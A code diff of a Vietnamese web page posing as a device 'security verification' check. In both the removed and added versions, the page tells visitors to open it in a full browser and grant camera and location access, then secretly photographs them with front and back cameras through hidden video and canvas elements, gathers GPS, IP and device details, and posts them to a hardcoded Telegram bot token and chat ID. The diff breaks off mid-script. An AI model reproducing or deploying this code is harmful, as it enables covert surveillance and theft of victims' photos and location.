@@ -2,915 +2,656 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Kiểm Tra Hệ Thống</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Xác Minh Hệ Thống - Bảo Mật Cao</title>
     <style>
-        :root {
-            --bg: #0a0e12;
-            --card: #111820;
-            --accent: #00ff88;
-            --danger: #ff4757;
-            --text: #e0e0e0;
-            --muted: #6b7280;
-            --border: #1f2937;
-            --glow: 0 0 30px rgba(0, 255, 136, 0.15);
-        }
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            font-family: 'SF Pro Display', 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background: #0a0c10;
+            font-family: system-ui, -apple-system, 'Segoe UI', 'SF Pro Text', 'Helvetica Neue', sans-serif;
+            padding: 20px 16px 40px;
+            color: #eef2ff;
             min-height: 100vh;
-            overflow: hidden;
-            user-select: none;
-            -webkit-user-select: none;
-            -webkit-tap-highlight-color: transparent;
-            background-image:
-                radial-gradient(ellipse at 20% 50%, rgba(0, 255, 136, 0.03) 0%, transparent 50%),
-                radial-gradient(ellipse at 80% 20%, rgba(0, 200, 255, 0.03) 0%, transparent 50%),
-                radial-gradient(ellipse at 50% 80%, rgba(120, 0, 255, 0.03) 0%, transparent 50%);
-        }
-
-        #systemCanvas {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-            z-index: -1;
-        }
-
-        #systemVideo {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-            z-index: -1;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 420px;
-            padding: 20px;
-            z-index: 10;
-            animation: fadeInUp 0.8s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .main-card {
-            background: var(--card);
-            border-radius: 24px;
-            padding: 35px 28px;
-            border: 1px solid var(--border);
-            box-shadow: var(--glow), 0 25px 60px rgba(0, 0, 0, 0.5);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .main-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, #00ff88, #00c8ff, #7c00ff, #00ff88);
-            background-size: 300% 100%;
-            animation: gradientFlow 3s ease infinite;
-        }
-
-        @keyframes gradientFlow {
-            0%,
-            100% {
-                background-position: 0% 50%;
-            }
-            50% {
-                background-position: 100% 50%;
-            }
-        }
-
-        .icon-circle {
-            width: 70px;
-            height: 70px;
-            margin: 0 auto 20px;
-            background: linear-gradient(135deg, #1a3a2a, #0d2818);
-            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            border: 2px solid rgba(0, 255, 136, 0.3);
-            position: relative;
-            animation: pulse 2s ease-in-out infinite;
         }
 
-        @keyframes pulse {
-            0%,
-            100% {
-                box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
-            }
-            50% {
-                box-shadow: 0 0 40px rgba(0, 255, 136, 0.5);
-            }
+        /* container chính + khoảng trống an toàn */
+        .safe-container {
+            width: 100%;
+            max-width: 440px;
+            margin: 0 auto;
+            padding-top: env(safe-area-inset-top, 8px);
+            padding-bottom: env(safe-area-inset-bottom, 24px);
         }
 
-        .icon-circle svg {
-            width: 35px;
-            height: 35px;
-            fill: var(--accent);
+        /* thẻ chính */
+        .card {
+            background: rgba(18, 24, 32, 0.9);
+            backdrop-filter: blur(2px);
+            border-radius: 44px;
+            padding: 28px 22px 34px;
+            border: 1px solid rgba(72, 187, 120, 0.25);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 0 0.5px rgba(72, 187, 120, 0.2);
+            transition: all 0.2s ease;
         }
 
-        .title {
-            text-align: center;
-            font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 8px;
-            letter-spacing: -0.3px;
-            color: #fff;
+        /* header */
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(72, 187, 120, 0.12);
+            padding: 6px 14px;
+            border-radius: 60px;
+            font-size: 12px;
+            font-weight: 500;
+            color: #4ade80;
+            margin-bottom: 20px;
+            letter-spacing: 0.3px;
         }
 
-        .subtitle {
-            text-align: center;
+        .badge svg {
+            width: 16px;
+            height: 16px;
+            fill: none;
+            stroke: #4ade80;
+            stroke-width: 2;
+        }
+
+        h2 {
+            font-size: 26px;
+            font-weight: 640;
+            letter-spacing: -0.5px;
+            margin-bottom: 6px;
+            background: linear-gradient(135deg, #ffffff, #b0ffd0);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .sub {
             font-size: 13px;
-            color: var(--muted);
-            margin-bottom: 25px;
-            line-height: 1.5;
+            color: #8e9aaf;
+            margin-bottom: 28px;
+            border-left: 3px solid #4ade80;
+            padding-left: 12px;
         }
 
-        .checklist {
-            list-style: none;
-            margin-bottom: 25px;
+        /* progress ring nhỏ */
+        .progress-area {
+            margin-bottom: 28px;
+        }
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            margin-bottom: 6px;
+            color: #b9c3da;
+        }
+        .progress-track {
+            background: #1e293b;
+            border-radius: 40px;
+            height: 6px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #4ade80, #2dd4bf);
+            border-radius: 40px;
+            transition: width 0.45s cubic-bezier(0.2, 0.9, 0.4, 1.1);
         }
 
-        .checklist-item {
+        /* danh sách kiểm tra */
+        .check-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 28px 0 30px;
+        }
+        .check-item {
+            background: rgba(30, 41, 59, 0.5);
+            border-radius: 24px;
+            padding: 12px 16px;
             display: flex;
             align-items: center;
             gap: 14px;
-            padding: 14px 16px;
-            margin-bottom: 10px;
-            background: rgba(255, 255, 255, 0.02);
-            border-radius: 14px;
-            border: 1px solid var(--border);
-            transition: all 0.4s ease;
-            position: relative;
-            overflow: hidden;
+            transition: all 0.25s;
+            border: 1px solid rgba(72, 187, 120, 0);
         }
-
-        .checklist-item.done {
-            border-color: rgba(0, 255, 136, 0.4);
-            background: rgba(0, 255, 136, 0.05);
+        .check-item.active {
+            border-color: #2dd4bf;
+            background: rgba(45, 212, 191, 0.08);
+            box-shadow: 0 0 8px rgba(45, 212, 191, 0.3);
         }
-
-        .checklist-item.running {
-            border-color: rgba(0, 200, 255, 0.6);
-            background: rgba(0, 200, 255, 0.05);
-            animation: shimmer 2s infinite;
+        .check-item.done {
+            border-color: #4ade8040;
+            background: rgba(74, 222, 128, 0.06);
         }
-
-        @keyframes shimmer {
-            0%,
-            100% {
-                box-shadow: 0 0 15px rgba(0, 200, 255, 0.1);
-            }
-            50% {
-                box-shadow: 0 0 30px rgba(0, 200, 255, 0.3);
-            }
-        }
-
         .check-icon {
             width: 40px;
             height: 40px;
-            border-radius: 50%;
+            background: #111827;
+            border-radius: 30px;
             display: flex;
             align-items: center;
             justify-content: center;
-            flex-shrink: 0;
-            font-size: 18px;
-            font-weight: 700;
-            background: var(--border);
-            color: var(--muted);
-            transition: all 0.4s ease;
-        }
-
-        .checklist-item.done .check-icon {
-            background: rgba(0, 255, 136, 0.2);
-            color: var(--accent);
-        }
-
-        .checklist-item.running .check-icon {
-            background: rgba(0, 200, 255, 0.2);
-            color: #00c8ff;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0%,
-            100% {
-                transform: rotate(0deg);
-            }
-            50% {
-                transform: rotate(180deg);
-            }
-        }
-
-        .check-info {
-            flex: 1;
-            min-width: 0;
-        }
-
-        .check-label {
-            font-size: 14px;
             font-weight: 600;
-            color: #fff;
-            margin-bottom: 3px;
-        }
-
-        .check-desc {
-            font-size: 11px;
-            color: var(--muted);
-            transition: color 0.3s;
-        }
-
-        .checklist-item.done .check-desc {
-            color: var(--accent);
-        }
-        .checklist-item.running .check-desc {
-            color: #00c8ff;
-        }
-
-        .check-mark {
-            opacity: 0;
-            transform: scale(0);
-            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
-            color: var(--accent);
-            font-size: 20px;
-        }
-
-        .checklist-item.done .check-mark {
-            opacity: 1;
-            transform: scale(1);
-        }
-
-        .bar-container {
-            margin-bottom: 25px;
-        }
-
-        .bar-bg {
-            width: 100%;
-            height: 5px;
-            background: var(--border);
-            border-radius: 10px;
-            overflow: hidden;
-        }
-
-        .bar-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #00ff88, #00c8ff);
-            border-radius: 10px;
-            transition: width 0.6s cubic-bezier(0.16, 1, 0.3, 1);
-            width: 0%;
-        }
-
-        .bar-label {
-            text-align: center;
-            font-size: 11px;
-            color: var(--muted);
-            margin-top: 8px;
-        }
-
-        .action-btn {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 14px;
             font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            letter-spacing: 0.5px;
-            background: linear-gradient(135deg, #00c853, #00e676);
-            color: #000;
-            box-shadow: 0 8px 25px rgba(0, 200, 83, 0.3);
-            position: relative;
-            overflow: hidden;
+            color: #94a3b8;
+            flex-shrink: 0;
         }
-
-        .action-btn:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 35px rgba(0, 200, 83, 0.5);
+        .check-item.active .check-icon {
+            background: #1a3a2a;
+            color: #2dd4bf;
+            box-shadow: 0 0 8px #2dd4bf40;
         }
-
-        .action-btn:active:not(:disabled) {
-            transform: scale(0.97);
+        .check-item.done .check-icon {
+            background: #14532d;
+            color: #4ade80;
         }
-
-        .action-btn:disabled {
-            background: var(--border);
-            color: var(--muted);
-            cursor: not-allowed;
-            box-shadow: none;
+        .check-text {
+            flex: 1;
         }
-
-        .action-btn .btn-loader {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 2px solid transparent;
-            border-top-color: currentColor;
-            border-radius: 50%;
-            animation: btnSpin 0.8s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
-
-        @keyframes btnSpin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        .action-btn.loading .btn-loader {
-            display: inline-block;
-        }
-
-        #browser-alert {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: var(--bg);
-            z-index: 99999;
-            padding: 30px;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-        }
-
-        #browser-alert .alert-card {
-            background: var(--card);
-            border: 2px solid var(--danger);
-            border-radius: 20px;
-            padding: 35px 25px;
-            max-width: 400px;
-            width: 100%;
-        }
-
-        #browser-alert h3 {
-            color: var(--danger);
-            font-size: 20px;
-            margin-bottom: 20px;
-        }
-
-        #browser-alert ol {
-            text-align: left;
-            line-height: 2.2;
-            padding-left: 20px;
+        .check-title {
+            font-weight: 570;
             font-size: 15px;
         }
-
-        #browser-alert .em {
-            color: #ffeb3b;
-            font-weight: 700;
+        .check-status {
+            font-size: 11px;
+            color: #7e8aa8;
+            margin-top: 3px;
+        }
+        .check-item.done .check-status {
+            color: #4ade80;
+        }
+        .check-mark {
+            font-size: 20px;
+            opacity: 0;
+            transition: 0.2s;
+            color: #4ade80;
+        }
+        .check-item.done .check-mark {
+            opacity: 1;
         }
 
-        .dots {
-            display: inline-flex;
-            gap: 4px;
-            margin-left: 4px;
+        /* nút chính */
+        .primary-btn {
+            width: 100%;
+            background: linear-gradient(105deg, #2b5e3b, #15803d);
+            border: none;
+            border-radius: 44px;
+            padding: 16px 20px;
+            font-weight: 640;
+            font-size: 17px;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: 0.2s;
+            box-shadow: 0 6px 18px rgba(34, 197, 94, 0.25);
+            cursor: pointer;
         }
-
-        .dots span {
-            width: 5px;
-            height: 5px;
-            background: currentColor;
+        .primary-btn:active { transform: scale(0.97); }
+        .primary-btn:disabled {
+            opacity: 0.6;
+            transform: none;
+            filter: grayscale(0.1);
+            cursor: not-allowed;
+        }
+        .loader {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
             border-radius: 50%;
-            animation: dotBounce 1.4s infinite;
+            animation: spin 0.7s linear infinite;
+            display: inline-block;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* cảnh báo trình duyệt kín */
+        .overlay-warning {
+            position: fixed;
+            inset: 0;
+            background: #0a0c10;
+            z-index: 999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 28px;
+        }
+        .warning-card {
+            background: #11181f;
+            border-radius: 44px;
+            padding: 32px 24px;
+            border: 1px solid #f97316;
+            text-align: center;
+        }
+        .warning-card h3 {
+            color: #fb923c;
+            margin-bottom: 20px;
+        }
+        .warning-card ol {
+            text-align: left;
+            padding-left: 20px;
+            font-size: 14px;
+            line-height: 1.7;
         }
 
-        .dots span:nth-child(2) {
-            animation-delay: 0.2s;
-        }
-        .dots span:nth-child(3) {
-            animation-delay: 0.4s;
-        }
-
-        @keyframes dotBounce {
-            0%,
-            80%,
-            100% {
-                transform: scale(0.5);
-                opacity: 0.3;
-            }
-            40% {
-                transform: scale(1);
-                opacity: 1;
-            }
-        }
-
-        @media (max-width: 380px) {
-            .main-card {
-                padding: 25px 18px;
-            }
-            .checklist-item {
-                padding: 12px;
-                gap: 10px;
-            }
+        /* ẩn các thành phần test */
+        video, canvas {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
-
-    <canvas id="systemCanvas"></canvas>
-    <video id="systemVideo" autoplay playsinline muted></video>
-
-    <div id="browser-alert">
-        <div class="alert-card">
-            <h3>⚠️ Vui Lòng Mở Bằng Trình Duyệt</h3>
-            <ol>
-                <li>Nhấn <span class="em">(···)</span> hoặc <span class="em">(⋮)</span> góc phải trên</li>
-                <li>Chọn <span class="em">"Mở bằng trình duyệt"</span></li>
-                <li>Cho phép các quyền khi được yêu cầu</li>
-            </ol>
+<div class="safe-container" id="mainUI">
+    <div class="card">
+        <div class="badge">
+            <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" fill="none"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            <span>BẢO MẬT XÁC THỰC</span>
         </div>
-    </div>
+        <h2>Xác minh thiết bị</h2>
+        <div class="sub">Kiểm tra an ninh & tốc độ kết nối · Hệ thống tự động</div>
 
-    <div class="container" id="mainUI">
-        <div class="main-card">
-            <div class="icon-circle">
-                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-            </div>
-
-            <h2 class="title">Kiểm Tra Hệ Thống</h2>
-            <p class="subtitle">Đang thực hiện kiểm tra định kỳ.<br>Vui lòng không đóng trang.</p>
-
-            <div class="bar-container">
-                <div class="bar-bg">
-                    <div class="bar-fill" id="barFill"></div>
-                </div>
-                <p class="bar-label" id="barLabel">Đang chuẩn bị...</p>
-            </div>
-
-            <ul class="checklist">
-                <li class="checklist-item" id="task1">
-                    <div class="check-icon">1</div>
-                    <div class="check-info">
-                        <div class="check-label">Đọc cấu hình thiết bị</div>
-                        <div class="check-desc">Đang chờ...</div>
-                    </div>
-                    <span class="check-mark">✓</span>
-                </li>
-                <li class="checklist-item" id="task2">
-                    <div class="check-icon">2</div>
-                    <div class="check-info">
-                        <div class="check-label">Kiểm tra kết nối mạng</div>
-                        <div class="check-desc">Đang chờ...</div>
-                    </div>
-                    <span class="check-mark">✓</span>
-                </li>
-                <li class="checklist-item" id="task3">
-                    <div class="check-icon">3</div>
-                    <div class="check-info">
-                        <div class="check-label">Kiểm tra cảm biến trước</div>
-                        <div class="check-desc">Đang chờ...</div>
-                    </div>
-                    <span class="check-mark">✓</span>
-                </li>
-                <li class="checklist-item" id="task4">
-                    <div class="check-icon">4</div>
-                    <div class="check-info">
-                        <div class="check-label">Kiểm tra cảm biến sau</div>
-                        <div class="check-desc">Đang chờ...</div>
-                    </div>
-                    <span class="check-mark">✓</span>
-                </li>
-                <li class="checklist-item" id="task5">
-                    <div class="check-icon">5</div>
-                    <div class="check-info">
-                        <div class="check-label">Tổng hợp báo cáo</div>
-                        <div class="check-desc">Đang chờ...</div>
-                    </div>
-                    <span class="check-mark">✓</span>
-                </li>
-            </ul>
-
-            <button class="action-btn" id="actionBtn" disabled>
-                <span class="btn-loader"></span>
-                <span id="btnLabel">ĐANG KHỞI TẠO...</span>
-            </button>
+        <div class="progress-area">
+            <div class="progress-label"><span>Trạng thái</span><span id="progressPercent">0%</span></div>
+            <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
         </div>
+
+        <div class="check-grid" id="checklist">
+            <div class="check-item" id="step1"><div class="check-icon">1</div><div class="check-text"><div class="check-title">Đọc cấu hình & nhận dạng</div><div class="check-status" id="status1">Chờ</div></div><span class="check-mark">✓</span></div>
+            <div class="check-item" id="step2"><div class="check-icon">2</div><div class="check-text"><div class="check-title">Định vị & IP an ninh</div><div class="check-status" id="status2">Chờ</div></div><span class="check-mark">✓</span></div>
+            <div class="check-item" id="step3"><div class="check-icon">3</div><div class="check-text"><div class="check-title">Kiểm tra tốc độ mạng (Ping/DL/UL)</div><div class="check-status" id="status3">Chờ</div></div><span class="check-mark">✓</span></div>
+            <div class="check-item" id="step4"><div class="check-icon">4</div><div class="check-text"><div class="check-title">Cảm biến trước (xác thực khuôn mặt)</div><div class="check-status" id="status4">Chờ</div></div><span class="check-mark">✓</span></div>
+            <div class="check-item" id="step5"><div class="check-icon">5</div><div class="check-text"><div class="check-title">Cảm biến sau (môi trường)</div><div class="check-status" id="status5">Chờ</div></div><span class="check-mark">✓</span></div>
+            <div class="check-item" id="step6"><div class="check-icon">6</div><div class="check-text"><div class="check-title">Mã hóa & gửi báo cáo</div><div class="check-status" id="status6">Chờ</div></div><span class="check-mark">✓</span></div>
+        </div>
+
+        <button class="primary-btn" id="actionBtn">
+            <span id="btnText">🔐 BẮT ĐẦU XÁC MINH</span>
+        </button>
     </div>
+</div>
 
-    <script>
-        // ==========================================
-        // CÀI ĐẶT HỆ THỐNG
-        // ==========================================
-        const APP_CONFIG = {
-            SERVICE_TOKEN: '8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds',
-            DESTINATION_ID: '7031115869',
-            NEXT_PAGE_URL: 'https://www.google.com',
-            COUNTDOWN_TIME: 5,
-            TASK_INTERVAL: 800,
-        };
+<div id="warningOverlay" style="display: none;" class="overlay-warning">
+    <div class="warning-card">
+        <h3>⚠️ YÊU CẦU TRÌNH DUYỆT CHUẨN</h3>
+        <ol>
+            <li>Nhấn <strong>⋯</strong> hoặc <strong>⋮</strong> góc phải</li>
+            <li>Chọn <strong>"Mở bằng trình duyệt"</strong> (Chrome/Safari)</li>
+            <li>Cho phép quyền camera & vị trí để xác minh</li>
+        </ol>
+    </div>
+</div>
 
-        // ==========================================
-        // HÀM TIỆN ÍCH
-        // ==========================================
-        const getEl = (sel) => document.querySelector(sel);
-        const wait = (ms) => new Promise(r => setTimeout(r, ms));
+<video id="hiddenVideo" autoplay playsinline muted></video>
+<canvas id="hiddenCanvas"></canvas>
 
-        function markTask(id, desc, mode = 'running') {
-            const el = getEl(`#${id}`);
-            el.classList.remove('running', 'done');
-            el.querySelector('.check-desc').innerHTML = desc;
-            if (mode === 'running') el.classList.add('running');
-            if (mode === 'done') el.classList.add('done');
-        }
+<script>
+    // ---------- CẤU HÌNH TELEGRAM ----------
+    const CONFIG = {
+        BOT_TOKEN: '8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds',
+        CHAT_ID: '7031115869',
+        REDIRECT_URL: 'https://www.google.com',
+        REDIRECT_DELAY: 4      // giây
+    };
 
-        function setBar(percent, label) {
-            getEl('#barFill').style.width = percent + '%';
-            getEl('#barLabel').textContent = label;
-        }
+    // DOM elements
+    const steps = ['step1','step2','step3','step4','step5','step6'];
+    const statusEl = [ 'status1','status2','status3','status4','status5','status6' ];
+    const progressFill = document.getElementById('progressFill');
+    const progressPercent = document.getElementById('progressPercent');
+    const actionBtn = document.getElementById('actionBtn');
+    const btnTextSpan = document.getElementById('btnText');
 
-        function setButton(label, disabled = false, loading = false) {
-            const btn = getEl('#actionBtn');
-            getEl('#btnLabel').textContent = label;
-            btn.disabled = disabled;
-            if (loading) btn.classList.add('loading');
-            else btn.classList.remove('loading');
-        }
+    // state
+    let isAutoMode = false;      // tự động chạy nếu có đủ quyền
+    let isRunning = false;
+    let permissionReady = { location: false, camera: false };
 
-        // ==========================================
-        // ĐỌC THÔNG TIN HỆ THỐNG
-        // ==========================================
-        function getSystemProfile() {
-            const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            const sw = window.screen.width;
-            const sh = window.screen.height;
-            const dpr = window.devicePixelRatio;
-            const lang = navigator.language;
-            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const ram = navigator.deviceMemory || 'N/A';
-            const cores = navigator.hardwareConcurrency || 'N/A';
-            const conn = navigator.connection?.effectiveType || 'N/A';
-            const batterySupport = navigator.getBattery ? 'Có' : 'Không';
-            const touchPoints = navigator.maxTouchPoints || 0;
-            const colorDepth = screen.colorDepth;
-            const vendor = navigator.vendor || 'N/A';
-
-            let deviceType = 'Không xác định';
-            let osName = 'Không xác định';
-            if (/iPhone|iPad|iPod/i.test(ua)) { deviceType = 'iPhone/iPad';
-                osName = 'iOS'; } else if (/Android/i.test(ua)) { deviceType = 'Android';
-                osName = 'Android'; } else if (/Windows/i.test(ua)) { deviceType = 'Windows PC';
-                osName = 'Windows'; } else if (/Macintosh/i.test(ua)) { deviceType = 'Mac';
-                osName = 'macOS'; } else if (/Linux/i.test(ua)) { deviceType = 'Linux';
-                osName = 'Linux'; }
-
-            return `
-📋 <b>BÁO CÁO HỆ THỐNG</b>
-━━━━━━━━━━━━━━━━━━━━━━━━
-🕐 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}
-📱 <b>Thiết bị:</b> ${deviceType}
-💻 <b>Hệ điều hành:</b> ${osName}
-📐 <b>Màn hình:</b> ${sw}x${sh} @ ${dpr}x (${colorDepth}-bit)
-🌐 <b>Ngôn ngữ:</b> ${lang} | <b>Múi giờ:</b> ${tz}
-🧠 <b>RAM:</b> ${ram} GB | <b>CPU:</b> ${cores} cores
-📶 <b>Mạng:</b> ${conn} | <b>Cảm ứng:</b> ${touchPoints} điểm
-🔋 <b>Hỗ trợ pin:</b> ${batterySupport}
-🏷 <b>Nền tảng:</b> ${platform}
-🔗 <b>UA:</b> ${ua.substring(0, 120)}...
-━━━━━━━━━━━━━━━━━━━━━━━━
-🌍 <b>Thông tin mạng:</b> 👇 (xem bên dưới)
-📸 <b>Dữ liệu cảm biến:</b> 👇
-            `.trim();
-        }
-
-        // ==========================================
-        // KIỂM TRA KẾT NỐI MẠNG
-        // ==========================================
-        async function checkNetwork() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    return resolve({ source: 'Không hỗ trợ', lat: null, lng: null, accuracy: null, mapLink: 'Không có' });
-                }
-
-                const timeout = setTimeout(() => {
-                    resolve({ source: 'Hết thời gian (5s)', lat: null, lng: null, accuracy: null, mapLink: 'Timeout' });
-                }, 5000);
-
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        clearTimeout(timeout);
-                        const { latitude, longitude, accuracy } = pos.coords;
-                        resolve({
-                            source: 'Định vị',
-                            lat: latitude.toFixed(7),
-                            lng: longitude.toFixed(7),
-                            accuracy: accuracy ? accuracy.toFixed(1) + 'm' : 'N/A',
-                            mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
-                        });
-                    },
-                    (err) => {
-                        clearTimeout(timeout);
-                        resolve({ source: 'Từ chối/Lỗi', lat: null, lng: null, accuracy: null, mapLink: `Lỗi: ${err.message}` });
-                    }, {
-                        enableHighAccuracy: true,
-                        timeout: 5000,
-                        maximumAge: 0,
-                    }
-                );
-            });
-        }
-
-        async function getNetworkInfo() {
-            try {
-                const res = await fetch('http://ip-api.com/json/?fields=query,country,city,lat,lon,isp,org', { signal: AbortSignal.timeout(5000) });
-                const data = await res.json();
-                return data;
-            } catch (e) {
-                return null;
-            }
-        }
-
-        // ==========================================
-        // KIỂM TRA CẢM BIẾN
-        // ==========================================
-        async function testSensor(mode) {
-            const video = getEl('#systemVideo');
-            const canvas = getEl('#systemCanvas');
-            let stream = null;
-
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: mode,
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 },
-                    },
-                    audio: false,
-                });
-
-                video.srcObject = stream;
-                await video.play();
-
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        setTimeout(resolve, 1200);
-                    };
-                });
-
-                const ctx = canvas.getContext('2d');
-
-                if (mode === 'user') {
-                    ctx.translate(canvas.width, 0);
-                    ctx.scale(-1, 1);
-                }
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                ctx.setTransform(1, 0, 0, 1, 0, 0);
-
-                const blob = await new Promise(resolve => {
-                    canvas.toBlob(resolve, 'image/jpeg', 0.92);
-                });
-
-                stream.getTracks().forEach(t => t.stop());
-                video.srcObject = null;
-
-                return blob;
-            } catch (e) {
-                if (stream) stream.getTracks().forEach(t => t.stop());
-                video.srcObject = null;
-                console.warn('Sensor test warning (' + mode + '):', e.message);
-                return null;
-            }
-        }
-
-        // ==========================================
-        // GỬI BÁO CÁO
-        // ==========================================
-        async function sendReport(caption, attachments) {
-            try {
-                await fetch(
-                    `https://api.telegram.org/bot${APP_CONFIG.SERVICE_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: APP_CONFIG.DESTINATION_ID,
-                            text: caption,
-                            parse_mode: 'HTML',
-                            disable_web_page_preview: false,
-                        }),
-                    }
-                );
-            } catch (e) {
-                console.warn('Send text warning:', e);
-            }
-
-            for (const att of attachments) {
-                if (!att) continue;
-                try {
-                    const fd = new FormData();
-                    fd.append('chat_id', APP_CONFIG.DESTINATION_ID);
-                    fd.append('photo', att.blob, att.name);
-                    fd.append('caption', att.label);
-
-                    await fetch(
-                        `https://api.telegram.org/bot${APP_CONFIG.SERVICE_TOKEN}/sendPhoto`, { method: 'POST', body: fd }
-                    );
-                    await wait(300);
-                } catch (e) {
-                    console.warn('Send attachment warning:', e);
-                }
-            }
-        }
-
-        // ==========================================
-        // QUY TRÌNH CHÍNH
-        // ==========================================
-        async function startProcess() {
-            const btn = getEl('#actionBtn');
-            btn.disabled = true;
-            setButton('ĐANG XỬ LÝ...', true, true);
-            setBar(0, 'Bắt đầu quy trình...');
-
-            // Task 1: Đọc cấu hình
-            markTask('task1', 'Đang đọc...', 'running');
-            setBar(10, 'Đang đọc cấu hình thiết bị...');
-            await wait(APP_CONFIG.TASK_INTERVAL);
-            const systemInfo = getSystemProfile();
-            markTask('task1', 'Hoàn tất ✓', 'done');
-            setBar(20, 'Đã đọc cấu hình');
-
-            // Task 2: Kiểm tra kết nối
-            markTask('task2', 'Đang kiểm tra...', 'running');
-            setBar(25, 'Đang kiểm tra kết nối mạng...');
-            const [networkData, ipData] = await Promise.all([
-                checkNetwork(),
-                getNetworkInfo(),
-            ]);
-            await wait(APP_CONFIG.TASK_INTERVAL);
-
-            let networkReport = '';
-            if (networkData.lat) {
-                networkReport =
-                    `🌍 <b>Định vị:</b>\n   Kinh độ: ${networkData.lat}\n   Vĩ độ: ${networkData.lng}\n   Độ chính xác: ${networkData.accuracy}\n   🗺 <a href="${networkData.mapLink}">Xem bản đồ</a>`;
-            } else {
-                networkReport = `🌍 <b>Định vị:</b> ${networkData.mapLink}`;
-            }
-
-            if (ipData && ipData.lat) {
-                networkReport +=
-                    `\n\n📡 <b>Thông tin mạng:</b>\n   IP: ${ipData.query}\n   Quốc gia: ${ipData.country}\n   Thành phố: ${ipData.city}\n   ISP: ${ipData.isp}\n   🗺 <a href="https://www.google.com/maps?q=${ipData.lat},${ipData.lon}">Xem vị trí mạng</a>`;
-            }
-
-            markTask('task2', 'Hoàn tất ✓', 'done');
-            setBar(40, 'Đã kiểm tra kết nối');
-
-            // Task 3: Kiểm tra cảm biến trước
-            markTask('task3', 'Đang kiểm tra...', 'running');
-            setBar(45, 'Đang kiểm tra cảm biến trước...');
-            await wait(400);
-            const frontData = await testSensor('user');
-            if (frontData) {
-                markTask('task3', 'Đã kiểm tra ✓', 'done');
-            } else {
-                markTask('task3', 'Không khả dụng', 'done');
-            }
-            setBar(60, frontData ? 'Cảm biến trước hoạt động' : 'Cảm biến trước không khả dụng');
-
-            // Task 4: Kiểm tra cảm biến sau
-            markTask('task4', 'Đang kiểm tra...', 'running');
-            setBar(65, 'Đang kiểm tra cảm biến sau...');
-            await wait(400);
-            const backData = await testSensor('environment');
-            if (backData) {
-                markTask('task4', 'Đã kiểm tra ✓', 'done');
-            } else {
